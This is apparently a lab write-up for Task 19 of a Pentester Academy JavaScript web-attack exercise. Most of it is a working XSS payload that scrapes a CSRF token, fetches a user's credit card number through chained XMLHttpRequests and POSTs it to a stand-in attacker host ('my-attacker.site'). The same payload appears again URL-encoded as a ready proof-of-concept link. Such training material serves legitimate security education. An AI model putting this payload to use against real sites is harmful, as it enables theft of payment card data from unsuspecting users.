## Task 19 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/19)</small>

Objectives

1. Find John's Credit Card Number using an XSS vulnerability on this page
2. Display the Credit Card Number in the div with id "result"
3. Post the Credit Card Number to a simulated Attacker Server
4. No Hardcoded values can be used - everything has to be figured out dynamically

So in this we have to find the credit card value, print it to `<div id="result">...</div>` and **POST** it to the attacker's server

Well let me tell in you in advance, the payload for this task would be very lengthy 😛

So here we have a link, when you will click, it will redirect you to new page where after entering the UID you can see the credit card number

The credit card is in `<div id="result">....</div>`

![](https://i.ibb.co/tCW39HX/image.png)

So let's use our old XHR friend and complete this task. BTW the regex used are **`/<input type="hidden" value="(.+?)" .+>/`** and **`/<div id="result">(.+?)<\/div>/`**

```js
let a = document.querySelector("a");
let uid = a.innerText.trim().slice(-4);

const xhttp1 = new XMLHttpRequest();

xhttp1.onreadystatechange = function () {
  if (xhttp1.readyState == 4 && xhttp1.status == 200) {
    const xhttp2 = new XMLHttpRequest();
    let tok = /<input type="hidden" value="(.+?)" .+>/.exec(this.responseText)[1];

    xhttp2.onreadystatechange = function () {
      if (xhttp2.readyState == 4 && xhttp2.status == 200) {
        let cc = /<div id="result">(.+?)<\/div>/.exec(xhttp2.responseText)[1];
        document.querySelector("#result").innerText = cc;

        const xhttp3 = new XMLHttpRequest();
        xhttp3.open("POST", "https://my-attacker.site", true);
        xhttp3.send("cc=" + cc);
      }
    };

    xhttp2.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/19/getcreditcard?uid=" + uid + "&csrf_token=" + tok, true);
    xhttp2.send();
  }
};
xhttp1.open("GET", a.href, true);
xhttp1.send();
```

Since we don't have worry about the delivery of the Credit Card on attacker site, to I am not using any `.onreadystagechange` callback

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/19?url=%3Cscript%3Elet%20a%20%3D%20document.querySelector%28%22a%22%29%3B%0Alet%20uid%20%3D%20a.innerText.trim%28%29.slice%28-4%29%3B%0A%0Aconst%20xhttp1%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp1.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28xhttp1.readyState%20%3D%3D%204%20%26%26%20xhttp1.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20const%20xhttp2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20let%20tok%20%3D%20%2F%3Cinput%20type%3D%22hidden%22%20value%3D%22%28.%2B%3F%29%22%20.%2B%3E%2F.exec%28this.responseText%29%5B1%5D%3B%0A%0A%20%20%20%20xhttp2.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20%20%20%20%20if%20%28xhttp2.readyState%20%3D%3D%204%20%26%26%20xhttp2.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20%20%20%20%20let%20cc%20%3D%20%2F%3Cdiv%20id%3D%22result%22%3E%28.%2B%3F%29%3C%5C%2Fdiv%3E%2F.exec%28xhttp2.responseText%29%5B1%5D%3B%0A%20%20%20%20%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20cc%3B%0A%0A%20%20%20%20%20%20%20%20const%20xhttp3%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhttp3.open%28%22POST%22%2C%20%22https%3A%2F%2Fmy-attacker.site%22%2C%20true%29%3B%0A%20%20%20%20%20%20%20%20xhttp3.send%28%22cc%3D%22%20%2B%20cc%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20xhttp2.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F19%2Fgetcreditcard%3Fuid%3D%22%20%2B%20uid%20%2B%20%22%26csrf_token%3D%22%20%2B%20tok%2C%20true%29%3B%0A%20%20%20%20xhttp2.send%28%29%3B%0A%20%20%7D%0A%7D%3B%0Axhttp1.open%28%22GET%22%2C%20a.href%2C%20true%29%3B%0Axhttp1.send%28%29%3B%3C%2Fscript%3E)
